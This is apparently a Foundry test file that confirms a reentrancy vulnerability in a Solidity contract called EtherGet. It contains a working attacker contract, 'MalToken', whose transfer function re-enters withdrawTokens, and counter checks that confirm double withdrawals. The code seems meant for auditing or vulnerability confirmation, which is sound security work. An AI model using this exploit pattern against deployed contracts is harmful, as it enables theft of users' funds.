// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x52d2e0f9b01101a59b38a3d05c80b7618aeed984.sol";

contract MalToken {
    EtherGet public victim;
    address public owner;
    uint256 public transferCalls;
    bool private reentered;

    constructor() {
        owner = msg.sender;
    }

    function setVictim(EtherGet _victim) public {
        victim = _victim;
    }

    function balanceOf(address) external view returns (uint256) {
        return 1000 ether;
    }

    function transfer(address, uint256) external returns (bool) {
        transferCalls++;
        if (!reentered) {
            reentered = true;
            victim.withdrawTokens(address(this)); // Re-entrant call
            reentered = false;
        }
        return true;
    }

    function attack() public {
        victim.withdrawTokens(address(this));
    }
}

contract EtherGetReentrancyTest is Test {
    EtherGet etherGet;
    MalToken malToken;

    function setUp() public {
        malToken = new MalToken();
        vm.prank(address(malToken));
        etherGet = new EtherGet();
        malToken.setVictim(etherGet);
    }

    function testReentrancy() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 initialTotalTokenOperations = etherGet.totalTokenOperations();
        uint256 initialTokenWithdrawalCount = etherGet.tokenWithdrawalCount(address(malToken));
        console.log("Initial totalTokenOperations: %s", initialTotalTokenOperations);
        console.log("Initial tokenWithdrawalCount for malToken: %s", initialTokenWithdrawalCount);

        console.log("--- Trigger Attack ---");
        vm.prank(address(malToken));
        malToken.attack();

        console.log("--- AFTER-Trigger State ---");
        uint256 newTotalTokenOperations = etherGet.totalTokenOperations();
        uint256 newTokenWithdrawalCount = etherGet.tokenWithdrawalCount(address(malToken));
        console.log("New totalTokenOperations: %s", newTotalTokenOperations);
        console.log("New tokenWithdrawalCount for malToken: %s", newTokenWithdrawalCount);

        uint256 deltaTotalOperations = newTotalTokenOperations - initialTotalTokenOperations;
        uint256 deltaWithdrawalCount = newTokenWithdrawalCount - initialTokenWithdrawalCount;
        console.log("Delta totalTokenOperations: %s", deltaTotalOperations);
        console.log("Delta tokenWithdrawalCount: %s", deltaWithdrawalCount);

        // Differential validity check - both must increase by 2
        if (deltaTotalOperations == 2 && deltaWithdrawalCount == 2) {
            console.log("VULNERABILITY CONFIRMED: Reentrancy caused double operations & withdrawals");
            console.log("Vulnerability Exists: Reentrancy attack succeeded causing double token operations and double token withdrawals");
        } else {
            console.log("VULNERABILITY NOT DETECTED: Abnormal operation counts (%s total, %s withdrawal)", deltaTotalOperations, deltaWithdrawalCount);
            console.log("Vulnerability not Exist: State increments do not match reentrant behavior (both deltas should be 2)");
        }
    }
}